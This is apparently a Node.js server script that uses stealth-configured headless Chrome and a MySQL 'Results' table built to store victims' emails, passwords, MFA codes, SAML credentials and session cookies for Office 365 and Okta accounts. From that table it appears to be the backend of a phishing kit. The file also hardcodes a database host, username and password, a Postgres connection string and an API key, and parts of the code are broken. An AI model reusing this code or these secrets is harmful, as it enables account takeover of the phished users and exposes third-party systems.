#!/usr/bin/env node

//const { addExtra } = require("puppeteer-extra");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
//const AdblockerPlugin = require("puppeteer-extra-plugin-adblocker");
const { Cluster } = require("puppeteer-cluster");
const express = require("express");
const bodyParser = require("body-parser");
const app = express();
const path = require("path");
//const puppeteer = addExtra(vanillaPuppeteer);
puppeteer.use(StealthPlugin());
//puppeteer.use(AdblockerPlugin({ blockTrackers: true }));


const request = require("request")
const fetch = require("node-fetch")
var mysql = require("mysql");
const { Pool } = require("pg");
//import fetch from "node-fetch";
//const fetch = (url) => import('node-fetch').then(({default: fetch}) => fetch(url));
//const validUrl = require("valid-url")
//const puppeteer = require("puppeteer");



// app.use(express.static(path.join(__dirname, "public")));

app.use(bodyParser.json());

const PORT = process.env.PORT || 3000;
console.log('starting server... port: ',port);
const server = app.listen(port, function(err){
    if (err) {console.log("Error in server setup: ",err);console.log("Server restarting...");process.exit(0);}else{
    console.log("Server listening on Port ", port);}
})


(async () => {
console.log('NewclusterLanuch');
const launchOptions = {
    headless: true,//'new'
    //ignoreDefaultArgs: true, // needed ?
    devtools: false,//
    ignoreHTTPSErrors: true,        // 忽略证书错误
    //waitUntil: 'networkidle2',
    timeout: 0,
    defaultViewport:{
        //width: 1920,
        //height: 1080
	width: 1280,
        height: 882
       // width: 640,
       // height: 480
    },
    /*args: [
        '--disable-gpu',
        '--disable-dev-shm-usage',
        '--disable-web-security',
        '--disable-xss-auditor',    // 关闭 XSS Auditor
        '--no-zygote',
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--allow-running-insecure-content',     // 允许不安全内容
        '--disable-webgl',
        '--disable-popup-blocking',
        //'--proxy-server=http://127.0.0.1:8080'      // 配置代理
    ],*/
   
	args: [
        //'--crash-test', // Causes the browser process to crash on startup, useful to see if we catch that correctly
        // not idea if those 2 aa options are usefull with disable gl thingy
        '--disable-canvas-aa', // Disable antialiasing on 2d canvas
        '--disable-2d-canvas-clip-aa', // Disable antialiasing on 2d canvas clips
        '--disable-gl-drawing-for-tests', // BEST OPTION EVER! Disables GL drawing operations which produce pixel output. With this the GL output will not be correct but tests will run faster.
        '--disable-dev-shm-usage', // ???
        '--no-zygote', // wtf does that mean ?
        '--use-gl=swiftshader', // better cpu usage with --use-gl=desktop rather than --use-gl=swiftshader, still needs more testing.
        '--enable-webgl',
        '--hide-scrollbars',
        '--mute-audio',
        '--no-first-run',
        '--disable-infobars',
        '--disable-breakpad',
        //'--ignore-gpu-blacklist',
        '--window-size=1280,1024', // see defaultViewport
        '--user-data-dir=./chromeData', // created in index.js, guess cache folder ends up inside too.
        '--no-sandbox', // meh but better resource comsuption
        '--disable-setuid-sandbox' // same
        // '--proxy-server=socks5://127.0.0.1:9050' // tor if needed
		],
  executablePath:
        process.env.NODE_ENV === "production"
          ? process.env.PUPPETEER_EXECUTABLE_PATH
          : process.env.PUPPETEER_EXECUTABLE_PATH,

};        
const clusterLanuchOptions = {
    concurrency: Cluster.CONCURRENCY_CONTEXT,//CONCURRENCY_BROWSER
    maxConcurrency: 3,
    retryLimit: 0,   // 重试次数 0
    //skipDuplicateUrls: true,  // 不爬重复的url
    //monitor: true,  // 显示性能消耗
    timeout:800000,//milliseconds//300000
    puppeteer,
    puppeteerOptions: launchOptions
};            
            
const cluster = await Cluster.launch(clusterLanuchOptions);
	/*	
  const cluster = await Cluster.launch({
    concurrency: Cluster.CONCURRENCY_CONTEXT,
    maxConcurrency: 2,
  });*/




app.get("/test", async (req, res) => {

console.log("Get Request");
  await cluster.task(async ({ page, data: url }) => {
	  console.log("Starting cluster task");
    await page.goto(url, {waitUntil: 'domcontentloaded'});//networkidle2
	  //load(11),domcontentloaded(7sec),networkidle0(11),networkidle2(11)
	  console.log('taking screenshot');
    const screenshot = await page.screenshot();
      console.log('taking screenshot is done');
      return screenshot;	  
  });

try {
const result = await cluster.execute('https://fast.com/fr/');
	    console.log("sending screenshot");
	    //res.statusCode = 200;
    //res.setHeader("Content-Type", "image/png");
        res.end(result, 'binary');
	//res.end();
	console.log("screenshot is sent");
    } catch (err) {
	console.log("screenshot ERROR:",err);
        res.end('SCREENSHOT ERROR');
        // Handle crawling error
    }
	console.log("Closing cluster");
 // await cluster.idle();
//  await cluster.close();
	console.log("Cluster is closed");
return;
        console.log("Request is finished");

  
});


 })();























//process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
//const psql = "postgres://exdatabase_user:qklrKQWTmbC2HC8UUYorHLMqAZPA1Gok@dpg-cnpnsrv109ks738pio00-a.oregon-postgres.render.com/exdatabase";
const DomainHosting = "onrender.com";
//const dotenv = require("dotenv");
//dotenv.config();

console.log('user: ',process.env.PGUSER)
console.log('host: ',process.env.PGHOST)
console.log('database: ',process.env.PGDATABASE)
console.log('password: ',process.env.PGPASSWORD)
console.log('port: ',process.env.PGPORT)

const DbConfig={
  host     : '79.124.59.22',//localhost//
  user     : 'exrobot3_exrobotos',
  password : '$oeMeQS{)K9f',
  database : 'exrobot3_adminv5',
  timezone : '+00:00'
  //debug: true
    };




server.keepAliveTimeout = 120 * 1000;//2minutes
server.headersTimeout = 120 * 1000;//2minutes

 app.get("/", function(req, res) {
let date_ob = new Date();

// current date
// adjust 0 before single digit date
let date = ("0" + date_ob.getDate()).slice(-2);

// current month
let month = ("0" + (date_ob.getMonth() + 1)).slice(-2);

// current year
let year = date_ob.getFullYear();

// current hours
let hours = date_ob.getHours();

// current minutes
let minutes = date_ob.getMinutes();

// current seconds
let seconds = date_ob.getSeconds();

// prints date & time in YYYY-MM-DD HH:MM:SS format
console.log(year + "-" + month + "-" + date + " " + hours + ":" + minutes + ":" + seconds);
// console.log("req0:");
//res.send(year + "-" + month + "-" + date + " " + hours + ":" + minutes + ":" + seconds)




	 
 });

//REGEXP CPANEL SEARCH:  ='[^'+]*'
//process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
//const devices = require('puppeteer/DeviceDescrtors');
var isdebug = true;
(async () => {

try{
var ThisSessionLocation;	
ThisSessionLocation = await fetch(`https://extreme-ip-lookup.com/json/?key=Qn97RtiI2gwjStzJJjuG`,{cache: "no-cache"}).then(function(response) { return response.json(); }).then(function(json) {if(json&&json.status&&json.status=="success"){const ThisLocation = [];ThisLocation['ip']=json.query;ThisLocation['country']=json.country;ThisLocation['countryCode']=json.countryCode; return ThisLocation;}else{return false;} });
if(ThisSessionLocation){
console.log('This Session Location Is Success');	
console.log('This Session Location IP:'+ThisSessionLocation["ip"]);
console.log('This Session Location COUNTRY:'+ThisSessionLocation["country"]);
console.log('This Session COUNTRY Code:'+ThisSessionLocation["countryCode"]);	
}
}catch(err){console.log('This Session Location Is Failed... err:'+err);}

/*process.on('uncaughtException', function(err) {
 console.log('Caught exception: ' + err);
 console.log(err.stack);
});*/


var con;

function handleDisconnect() {
  con = mysql.createConnection(DbConfig); // Recreate the connection, since
                                                  // the old one cannot be reused.

  con.connect(function(err) {              // The server is either down
    if(err) {                                     // or restarting (takes a while sometimes).
      console.log('error when connecting to db:', err);
      setTimeout(handleDisconnect, 2000); // We introduce a delay before attempting to reconnect,
    }                                     // to avoid a hot loop, and to allow our node script to

  });                                     // process asynchronous requests in the meantime.
                                          // If you're also serving http, display a 503 error.
  con.on('error', function(err) {
    console.log('db error', err);
    if(err.code === 'PROTOCOL_CONNECTION_LOST') { // Connection to the MySQL server is usually
      handleDisconnect();                         // lost due to either server restart, or a
    } else {                                      // connnection idle timeout (the wait_timeout
      throw err;                                  // server variable configures this)
    }
  });
}

//handleDisconnect();

//function Poolconnect() {
//const connectDb = async () => {
    try {
        const pool = new Pool({
            user: process.env.PGUSER,
            host: process.env.PGHOST,
            database: process.env.PGDATABASE,
            password: process.env.PGPASSWORD,
            port: process.env.PGPORT,
        });
 
        await pool.connect()
        const res = await pool.query('SELECT NOW()')
        //console.log("res:",res)
	console.log('pool postgres database is successfuly connected')  
        await pool.end()  
    } catch (error) {
        console.log(error)
	console.log('pool postgres database is failed')    
    }
//}
 
//connectDb()
//}
	//Poolconnect();




  

  
  
  
  let query = `DESCRIBE Results`;
    con.query(query, (err, rows) => {
        //con.resume();
        if(err && err.code && err.code=='ER_NO_SUCH_TABLE') {
        console.log("Results Table Not Exist err:'ER_NO_SUCH_TABLE'");
        
        
        
        
  // SET SESSION time_zone='+00:00';
  let query = `create table if not exists Results (
  id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  EMAIL VARCHAR(255) NOT NULL,
  PASSWORD VARCHAR(50) DEFAULT NULL,
  STATUS VARCHAR(25) DEFAULT NULL,
  
  IsO365 BIT DEFAULT 0,
  IsSAML BIT DEFAULT 0,
  IsOKTA BIT DEFAULT 0,
  IsAdmin BIT DEFAULT 0,
  IsLogged BIT DEFAULT 0,
  IsAdLogged BIT DEFAULT 0,
  SAML VARCHAR(1024) DEFAULT NULL,
  SAML_user VARCHAR(50) DEFAULT NULL,
  SAML_pass VARCHAR(50) DEFAULT NULL,
  SAML_admin VARCHAR(1024) DEFAULT NULL,
  
  AccountTYPE VARCHAR(50) DEFAULT NULL,
  AccCOUNTRY CHAR(2) DEFAULT NULL,
  
  UserID VARCHAR(25) DEFAULT NULL,
  UserIP VARCHAR(50) DEFAULT NULL,
  UserCOUNTRY CHAR(2) DEFAULT NULL,
  UserUA VARCHAR(255) DEFAULT NULL,
  
  MfaTYPE VARCHAR(20) DEFAULT NULL,
  MfaSTATUS VARCHAR(25) DEFAULT NULL,
  MfaCODE INT(6) ZEROFILL UNSIGNED DEFAULT NULL,
  
  ServerHOST VARCHAR(512) DEFAULT NULL,
  ServerIP VARCHAR(50) DEFAULT NULL,
  
  SessionSTATUS BIT DEFAULT 0,
  SESSION VARCHAR(20000) DEFAULT NULL,
  AdSESSION VARCHAR(20000) DEFAULT NULL,
  SessionIP VARCHAR(50) DEFAULT NULL,
  SessCOUNTRY CHAR(2) DEFAULT NULL,
  SessionUA VARCHAR(255) DEFAULT NULL,
  
  AppID VARCHAR(25) DEFAULT NULL,
  AdminPanel VARCHAR(512) DEFAULT NULL,
  
  WhiteIP VARCHAR(255) DEFAULT NULL,
  DATE TIMESTAMP,
  LastUPDATE TIMESTAMP,
  ExpiryDATE TIMESTAMP
)`;
/*
  DATE TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  LastUPDATE TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  ExpiryDATE TIMESTAMP
*/
//;ALTER TABLE Results AUTO_INCREMENT = 1;
//DATE_ADD(CURRENT_TIMESTAMP, INTERVAL 9 DAY)
//DEFAULT (date_add(current_timestamp, interval 9 day))  
//created
//updated
//SELECT @@GLOBAL.time_zone, @@SESSION.time_zone;
    con.query(query, (err, rows) => {
        //con.resume();
        if(err) throw err;
  //console.log("Table Creation Failed");
    console.log("Successfully Created Table - Results");
})
  
}else if(err) {
    console.log("'DESCRIBE Results' mysql query err:",err);
//handleDisconnect();            
}else{
        console.log("Results Table Already Exist");
        }
  //console.log("Table Creation Failed");
    
    })
  







process.on('uncaughtException', function(e) {
    //console.error('Ouch, an unhandled exception: '+e);
    console.log('Error stack: '+e.stack);
    //I like using new Error() for my errors (1)
    //console.error(e instanceof Error ? e.message : e);
});
/////////////////////////////////////////////////////////////////////////////
var catchAll = {
    'yahoo.com':'true',
    'yahoo.fr':'true',
    'outlook.com':'false',
    'hotmail.fr':'false',
    'live.com':'false',
    'hotmail.com':'false'
    }
function checkCatchAll (email) {
var isp=email.split('@')[1];
    if (catchAll.hasOwnProperty(isp)) {
        if(catchAll[isp]=='true'){
        return 'true';
        } else {
        return 'false';
        }
    } else {
        return false;
    }
}
///////////////////start fonction get country name from country code////////////////////////////
var isoCountries = {
    'AF' : 'Afghanistan',
    'AX' : 'Aland Islands',
    'AL' : 'Albania',
    'DZ' : 'Algeria',
    'AS' : 'American Samoa',
    'AD' : 'Andorra',
    'AO' : 'Angola',
    'AI' : 'Anguilla',
    'AQ' : 'Antarctica',
    'AG' : 'Antigua And Barbuda',
    'AR' : 'Argentina',
    'AM' : 'Armenia',
    'AW' : 'Aruba',
    'AU' : 'Australia',
    'AT' : 'Austria',
    'AZ' : 'Azerbaijan',
    'BS' : 'Bahamas',
    'BH' : 'Bahrain',
    'BD' : 'Bangladesh',
    'BB' : 'Barbados',
    'BY' : 'Belarus',
    'BE' : 'Belgium',
    'BZ' : 'Belize',
    'BJ' : 'Benin',
    'BM' : 'Bermuda',
    'BT' : 'Bhutan',
    'BO' : 'Bolivia',
    'BA' : 'Bosnia And Herzegovina',
    'BW' : 'Botswana',
    'BV' : 'Bouvet Island',
    'BR' : 'Brazil',
    'IO' : 'British Indian Ocean Territory',
    'BN' : 'Brunei Darussalam',
    'BG' : 'Bulgaria',
    'BF' : 'Burkina Faso',
    'BI' : 'Burundi',
    'KH' : 'Cambodia',
    'CM' : 'Cameroon',
    'CA' : 'Canada',
    'CV' : 'Cape Verde',
    'KY' : 'Cayman Islands',
    'CF' : 'Central African Republic',
    'TD' : 'Chad',
    'CL' : 'Chile',
    'CN' : 'China',
    'CX' : 'Christmas Island',
    'CC' : 'Cocos (Keeling) Islands',
    'CO' : 'Colombia',
    'KM' : 'Comoros',
    'CG' : 'Congo',
    'CD' : 'Congo, Democratic Republic',
    'CK' : 'Cook Islands',
    'CR' : 'Costa Rica',
    'CI' : 'Cote D\'Ivoire',
    'HR' : 'Croatia',
    'CU' : 'Cuba',
    'CY' : 'Cyprus',
    'CZ' : 'Czech Republic',
    'DK' : 'Denmark',
    'DJ' : 'Djibouti',
    'DM' : 'Dominica',
    'DO' : 'Dominican Republic',
    'EC' : 'Ecuador',
    'EG' : 'Egypt',
    'SV' : 'El Salvador',
    'GQ' : 'Equatorial Guinea',
    'ER' : 'Eritrea',
    'EE' : 'Estonia',
    'ET' : 'Ethiopia',
    'FK' : 'Falkland Islands (Malvinas)',
    'FO' : 'Faroe Islands',
    'FJ' : 'Fiji',
    'FI' : 'Finland',
    'FR' : 'France',
    'GF' : 'French Guiana',
    'PF' : 'French Polynesia',
    'TF' : 'French Southern Territories',
    'GA' : 'Gabon',
    'GM' : 'Gambia',
    'GE' : 'Georgia',
    'DE' : 'Germany',
    'GH' : 'Ghana',
    'GI' : 'Gibraltar',
    'GR' : 'Greece',
    'GL' : 'Greenland',
    'GD' : 'Grenada',
    'GP' : 'Guadeloupe',
    'GU' : 'Guam',
    'GT' : 'Guatemala',
    'GG' : 'Guernsey',
    'GN' : 'Guinea',
    'GW' : 'Guinea-Bissau',
    'GY' : 'Guyana',
    'HT' : 'Haiti',
    'HM' : 'Heard Island & Mcdonald Islands',
    'VA' : 'Holy See (Vatican City State)',
    'HN' : 'Honduras',
    'HK' : 'Hong Kong',
    'HU' : 'Hungary',
    'IS' : 'Iceland',
    'IN' : 'India',
    'ID' : 'Indonesia',
    'IR' : 'Iran, Islamic Republic Of',
    'IQ' : 'Iraq',
    'IE' : 'Ireland',
    'IM' : 'Isle Of Man',
    'IL' : 'Israel',
    'IT' : 'Italy',
    'JM' : 'Jamaica',
    'JP' : 'Japan',
    'JE' : 'Jersey',
    'JO' : 'Jordan',
    'KZ' : 'Kazakhstan',
    'KE' : 'Kenya',
    'KI' : 'Kiribati',
    'KR' : 'Korea',
    'KW' : 'Kuwait',
    'KG' : 'Kyrgyzstan',
    'LA' : 'Lao People\'s Democratic Republic',
    'LV' : 'Latvia',
    'LB' : 'Lebanon',
    'LS' : 'Lesotho',
    'LR' : 'Liberia',
    'LY' : 'Libyan Arab Jamahiriya',
    'LI' : 'Liechtenstein',
    'LT' : 'Lithuania',
    'LU' : 'Luxembourg',
    'MO' : 'Macao',
    'MK' : 'Macedonia',
    'MG' : 'Madagascar',
    'MW' : 'Malawi',
    'MY' : 'Malaysia',
    'MV' : 'Maldives',
    'ML' : 'Mali',
    'MT' : 'Malta',
    'MH' : 'Marshall Islands',
    'MQ' : 'Martinique',
    'MR' : 'Mauritania',
    'MU' : 'Mauritius',
    'YT' : 'Mayotte',
    'MX' : 'Mexico',
    'FM' : 'Micronesia, Federated States Of',
    'MD' : 'Moldova',
    'MC' : 'Monaco',
    'MN' : 'Mongolia',
    'ME' : 'Montenegro',
    'MS' : 'Montserrat',
    'MA' : 'Morocco',
    'MZ' : 'Mozambique',
    'MM' : 'Myanmar',
    'NA' : 'Namibia',
    'NR' : 'Nauru',
    'NP' : 'Nepal',
    'NL' : 'Netherlands',
    'AN' : 'Netherlands Antilles',
    'NC' : 'New Caledonia',
    'NZ' : 'New Zealand',
    'NI' : 'Nicaragua',
    'NE' : 'Niger',
    'NG' : 'Nigeria',
    'NU' : 'Niue',
    'NF' : 'Norfolk Island',
    'MP' : 'Northern Mariana Islands',
    'NO' : 'Norway',
    'OM' : 'Oman',
    'PK' : 'Pakistan',
    'PW' : 'Palau',
    'PS' : 'Palestinian Territory, Occupied',
    'PA' : 'Panama',
    'PG' : 'Papua New Guinea',
    'PY' : 'Paraguay',
    'PE' : 'Peru',
    'PH' : 'Philippines',
    'PN' : 'Pitcairn',
    'PL' : 'Poland',
    'PT' : 'Portugal',
    'PR' : 'Puerto Rico',
    'QA' : 'Qatar',
    'RE' : 'Reunion',
    'RO' : 'Romania',
    'RU' : 'Russian Federation',
    'RW' : 'Rwanda',
    'BL' : 'Saint Barthelemy',
    'SH' : 'Saint Helena',
    'KN' : 'Saint Kitts And Nevis',
    'LC' : 'Saint Lucia',
    'MF' : 'Saint Martin',
    'PM' : 'Saint Pierre And Miquelon',
    'VC' : 'Saint Vincent And Grenadines',
    'WS' : 'Samoa',
    'SM' : 'San Marino',
    'ST' : 'Sao Tome And Principe',
    'SA' : 'Saudi Arabia',
    'SN' : 'Senegal',
    'RS' : 'Serbia',
    'SC' : 'Seychelles',
    'SL' : 'Sierra Leone',
    'SG' : 'Singapore',
    'SK' : 'Slovakia',
    'SI' : 'Slovenia',
    'SB' : 'Solomon Islands',
    'SO' : 'Somalia',
    'ZA' : 'South Africa',
    'GS' : 'South Georgia And Sandwich Isl.',
    'ES' : 'Spain',
    'LK' : 'Sri Lanka',
    'SD' : 'Sudan',
    'SR' : 'Suriname',
    'SJ' : 'Svalbard And Jan Mayen',
    'SZ' : 'Swaziland',
    'SE' : 'Sweden',
    'CH' : 'Switzerland',
    'SY' : 'Syrian Arab Republic',
    'TW' : 'Taiwan',
    'TJ' : 'Tajikistan',
    'TZ' : 'Tanzania',
    'TH' : 'Thailand',
    'TL' : 'Timor-Leste',
    'TG' : 'Togo',
    'TK' : 'Tokelau',
    'TO' : 'Tonga',
    'TT' : 'Trinidad And Tobago',
    'TN' : 'Tunisia',
    'TR' : 'Turkey',
    'TM' : 'Turkmenistan',
    'TC' : 'Turks And Caicos Islands',
    'TV' : 'Tuvalu',
    'UG' : 'Uganda',
    'UA' : 'Ukraine',
    'AE' : 'United Arab Emirates',
    'GB' : 'United Kingdom',
    'US' : 'United States',
    'UM' : 'United States Outlying Islands',
    'UY' : 'Uruguay',
    'UZ' : 'Uzbekistan',
    'VU' : 'Vanuatu',
    'VE' : 'Venezuela',
    'VN' : 'Viet Nam',
    'VG' : 'Virgin Islands, British',
    'VI' : 'Virgin Islands, U.S.',
    'WF' : 'Wallis And Futuna',
    'EH' : 'Sahara Marocain',
    'YE' : 'Yemen',
    'ZM' : 'Zambia',
    'ZW' : 'Zimbabwe'
};

function getCountryName (countryCode) {
    if (!countryCode || countryCode==='' || countryCode==='unknown' || countryCode==='undefined') {
        return 'undefined';
    } else if (isoCountries.hasOwnProperty(countryCode)) {
        return isoCountries[countryCode];
    } else {
        return countryCode;
    }
}
///////////////////end fonction get country name from country code/////////////////////
///////////////////start fonction get country name from country code/////////////////////
var Number2CountryCode = {
    "+93" : "AF",
    "+355" : "AL",
    "+213" : "DZ",
    "+1684" : "AS",
    "+376" : "AD",
    "+244" : "AO",
    "+1264" : "AI",
    "+1268" : "AG",
    "+54" : "AR",
    "+374" : "AM",
    "+297" : "AW",
    "+61" : "AU",
    "+43" : "AT",
    "+994" : "AZ",
    "+1242" : "BS",
    "+973" : "BH",
    "+880" : "BD",
    "+1246" : "BB",
    "+375" : "BY",
    "+32" : "BE",
    "+501" : "BZ",
    "+229" : "BJ",
    "+1441" : "BM",
    "+975" : "BT",
    "+591" : "BO",
    "+387" : "BA",
    "+267" : "BW",
    "+55" : "BR",
    "+246" : "IO",
    "+1284" : "VG",
    "+673" : "BN",
    "+359" : "BG",	
    "+226" : "BF",
    "+257" : "BI",
    "+855" : "KH",
    "+237" : "CM",
    "+1204" : "CA",	
    "+1226" : "CA",
    "+1236" : "CA",
    "+1249" : "CA",
    "+1250" : "CA",
    "+1289" : "CA",
    "+1306" : "CA",
    "+1343" : "CA",
    "+1365" : "CA",
    "+1387" : "CA",
    "+1403" : "CA",
    "+1416" : "CA",
    "+1418" : "CA",
    "+1431" : "CA",
    "+1437" : "CA",
    "+1438" : "CA",
    "+1450" : "CA",
    "+1506" : "CA",
    "+1514" : "CA",
    "+1519" : "CA",
    "+1548" : "CA",
    "+1579" : "CA",
    "+1581" : "CA",
    "+1587" : "CA",
    "+1604" : "CA",
    "+1613" : "CA",
    "+1639" : "CA",
    "+1647" : "CA",
    "+1672" : "CA",
    "+1705" : "CA",
    "+1709" : "CA",
    "+1742" : "CA",
    "+1778" : "CA",
    "+1780" : "CA",
    "+1782" : "CA",
    "+1807" : "CA",
    "+1819" : "CA",
    "+1825" : "CA",
    "+1867" : "CA",
    "+1873" : "CA",
    "+1902" : "CA",
    "+1905" : "CA",
    "+238" : "CV",
    "+599" : "BQ",
    "+1345" : "KY",
    "+236" : "CF",
    "+235" : "TD",
    "+56" : "CL",
    "+86" : "CN",
    "+61" : "CX",
    "+61" : "CC",
    "+57" : "CO",
    "+269" : "KM",
    "+243" : "CD",
    "+242" : "CG",
    "+682" : "CK",
    "+506" : "CR",
    "+225" : "CI",
    "+385" : "HR",
    "+53" : "CU",
    "+599" : "CW",
    "+357" : "CY",
    "+420" : "CZ",
    "+45" : "DK",
    "+253" : "DJ",
    "+1767" : "DM",
    "+1809" : "DO",
    "+1829" : "DO",
    "+1849" : "DO",
    "+593" : "EC",
    "+20" : "EG",
    "+503" : "SV",
    "+240" : "GQ",
    "+291" : "ER",
    "+372" : "EE",
    "+251" : "ET",
    "+500" : "FK",
    "+298" : "FO",
    "+679" : "FJ",
    "+358" : "FI",
    "+33" : "FR",
    "+594" : "GF",
    "+689" : "PF",
    "+241" : "GA",
    "+220" : "GM",
    "+995" : "GE",
    "+49" : "DE",
    "+233" : "GH",
    "+350" : "GI",
    "+30" : "GR",
    "+299" : "GL",
    "+1473" : "GD",
    "+590" : "GP",
    "+1671" : "GU",
    "+502" : "GT",
    "+44" : "GG",
    "+224" : "GN",
    "+245" : "GW",
    "+592" : "GY",
    "+509" : "HT",
    "+504" : "HN",
    "+852" : "HK",
    "+36" : "HU",
    "+354" : "IS",
    "+91" : "IN",
    "+62" : "ID",
    "+98" : "IR",
    "+964" : "IQ",
    "+353" : "IE",
    "+44" : "IM",
    "+972" : "IL",
    "+39" : "IT",
    "+1876" : "JM",
    "+81" : "JP",
    "+44" : "JE",
    "+962" : "JO",
    "+7" : "KZ",
    "+254" : "KE",
    "+686" : "KI",
    "+965" : "KW",
    "+996" : "KG",
    "+856" : "LA",
    "+371" : "LV",
    "+961" : "LB",
    "+266" : "LS",
    "+231" : "LR",
    "+218" : "LY",
    "+423" : "LI",
    "+370" : "LT",
    "+352" : "LU",
    "+853" : "MO",
    "+389" : "MK",
    "+261" : "MG",
    "+265" : "MW",
    "+60" : "MY",
    "+960" : "MV",
    "+223" : "ML",
    "+356" : "MT",
    "+692" : "MH",
    "+596" : "MQ",
    "+222" : "MR",
    "+230" : "MU",
    "+262" : "YT",
    "+52" : "MX",
    "+691" : "FM",
    "+373" : "MD",
    "+377" : "MC",
    "+976" : "MN",
    "+382" : "ME",
    "+1664" : "MS",
    "+212" : "MA",
    "+258" : "MZ",
    "+95" : "MM",
    "+264" : "NA",
    "+674" : "NR",
    "+977" : "NP",
    "+31" : "NL",
    "+687" : "NC",
    "+64" : "NZ",
    "+505" : "NI",
    "+227" : "NE",
    "+234" : "NG",
    "+683" : "NU",
    "+672" : "NF",
    "+850" : "KP",
    "+1670" : "MP",
    "+47" : "NO",
    "+968" : "OM",
    "+92" : "PK",
    "+680" : "PW",
    "+970" : "PS",
    "+507" : "PA",
    "+675" : "PG",
    "+595" : "PY",
    "+51" : "PE",
    "+63" : "PH",
    "+48" : "PL",
    "+351" : "PT",
    "+1787" : "PR",
    "+1939" : "PR",
    "+974" : "QA",
    "+262" : "RE",
    "+40" : "RO",
    "+7" : "RU",
    "+250" : "RW",
    "+590" : "BL",
    "+290" : "SH",
    "+1869" : "KN",
    "+1758" : "LC",
    "+590" : "MF",
    "+508" : "PM",
    "+1784" : "VC",
    "+685" : "WS",
    "+378" : "SM",
    "+239" : "ST",
    "+966" : "SA",
    "+221" : "SN",
    "+381" : "RS",
    "+248" : "SC",
    "+232" : "SL",
    "+65" : "SG",
    "+1721" : "SX",
    "+421" : "SK",
    "+386" : "SI",
    "+677" : "SB",
    "+252" : "SO",
    "+27" : "ZA",
    "+82" : "KR",
    "+211" : "SS",
    "+34" : "ES",
    "+94" : "LK",
    "+249" : "SD",
    "+597" : "SR",
    "+47" : "SJ",
    "+268" : "SZ",
    "+46" : "SE",
    "+41" : "CH",
    "+963" : "SY",
    "+886" : "TW",
    "+992" : "TJ",
    "+255" : "TZ",
    "+66" : "TH",
    "+670" : "TL",
    "+228" : "TG",
    "+690" : "TK",
    "+676" : "TO",
    "+1868" : "TT",
    "+216" : "TN",
    "+90" : "TR",
    "+993" : "TM",
    "+1649" : "TC",
    "+688" : "TV",
    "+1340" : "VI",
    "+256" : "UG",
    "+380" : "UA",
    "+971" : "AE",
    "+44" : "GB",
    "+1" : "US",
    "+598" : "UY",
    "+998" : "UZ",
    "+678" : "VU",
    "+39" : "VA",
    "+58" : "VE",
    "+84" : "VN",
    "+681" : "WF",
    "+967" : "YE",
    "+260" : "ZM",
    "+263" : "ZW",
    "+358" : "AX"
};
function getCountryCodeFromNumber (prefixNumber=false) {
    if (!prefixNumber || prefixNumber==='' || prefixNumber==='unknown' || prefixNumber==='undefined' || prefixNumber.substring(0, 1)!=='+' || prefixNumber.length<=1) {
        return 'undefined';
    } else if (Number2CountryCode.hasOwnProperty(prefixNumber.substring(0, 5))) {
        return Number2CountryCode[prefixNumber.substring(0, 5)];
    } else if (Number2CountryCode.hasOwnProperty(prefixNumber.substring(0, 4))) {
        return Number2CountryCode[prefixNumber.substring(0, 4)];
    } else if (Number2CountryCode.hasOwnProperty(prefixNumber.substring(0, 3))) {
        return Number2CountryCode[prefixNumber.substring(0, 3)];
    } else if (Number2CountryCode.hasOwnProperty(prefixNumber.substring(0, 2))) {
        return Number2CountryCode[prefixNumber.substring(0, 2)];
    } else {
        return prefixNumber;
    }
}
///////////////////end fonction get country name from country code/////////////////////


///////////////////start fonction get country name from country code////////////////////////////
var smtpConfig = {
    //@URL {'PROVIDER','URL','SMTP','PORT','USERNAME'}
    'mac.com' : ['.mac','','smtp.mac.com','',''],
    '' : ['012','','012.net.il','',''],
    '@smtp.012.net.il' : ['Smile 012','','smtp.012.net.il','',''],
    '' : ['1 and 1','','smtp.1and1.co.uk','',''],
    '' : ['1&1 Puretec','','smtp.1und1.com','',''],
    '' : ['11','','111.11.com','',''],
    '' : ['126.com','','smtp.126.com','',''],
    '' : ['12Move','','smtp.12move.nl','',''],
    '' : ['191','','mail.191.biz','',''],
    '' : ['191','','mail.191.it','',''],
    '' : ['191.biz','','mail.191.biz','',''],
    '' : ['191.it','','mail.191.it','',''],
    '' : ['191.it','','smtp.191.it','',''],
    '' : ['@home','','mail.com','',''],
    '' : ['A1','','mail.a1.nl','',''],
    '' : ['A1 austria','','smtp.a1.net','',''],
    '' : ['aaCACCA','','lamiaCacca.it','',''],
    '' : ['Acantho','','smtp.acantho.net','',''],
    '' : ['Access4Less','','smtp.access4less.net','',''],
    '' : ['Acon','','mail.acon.nl','',''],
    '' : ['Arcor.de','','mail.arcor.de','',''],
    '' : ['Active Network','','smtp.activenetwork.it','',''],
    '' : ['Actrix Networks','','mail.actrix.co.nz','',''],
    '' : ['Adams Cable','','smtp.echoes.net','',''],
    '' : ['Adelphia','','mail.adelphia.net','',''],
    '' : ['Adinet (Uruguay)','','adinet.com.uy','',''],
    '' : ['AGX','','mail.agx.it','',''],
    '' : ['akfree','','smtp.akfree.it','',''],
    '' : ['Albacom','','relay.albacom.net','',''],
    '' : ['Albacom','','smtp.albacom.net','',''],
    '' : ['alcotek','','smtp.alcotek.it','',''],
    '' : ['alcudiacastro','','mx1.hotmail.com','',''],
    '' : ['alice','','box.alice.it','',''],
    '' : ['Alice','','out.alice.it','',''],
    '' : ['alice','','out.aliceposta.it','',''],
    '' : ['Alice 1 Cent','','smtp.aruba.it','',''],
    '' : ['alice.it','','in.alice.it','',''],
    '' : ['aliceadsl','','aliceadsl.fr','',''],
    '' : ['aliceadsl','','smtp.aliceadsl.fr','',''],
    '' : ['alicebusiness','','mail.191.biz','',''],
    '' : ['aliceposta.it','','mail.tin.it','',''],
    '' : ['alifceadsl','','in.alice.it','',''],
    '' : ['Alltel','','mail.alltel.net','',''],
    '' : ['Algonet/Telenordia','','smtp.algonet.se','',''],
    '' : ['AltaVista.com','','email.1stup.com','',''],
    '' : ['Alma','','mail.alma.it','',''],
    '' : ['alo','','smtp.alocom.net','',''],
    '' : ['Alpikom','','smtp.akmail.it','',''],
    '' : ['Amaze.net.au','','mail.amaze.net.au','',''],
    '' : ['Ameritech DSL','','mailhost.col.ameritech.net','',''],
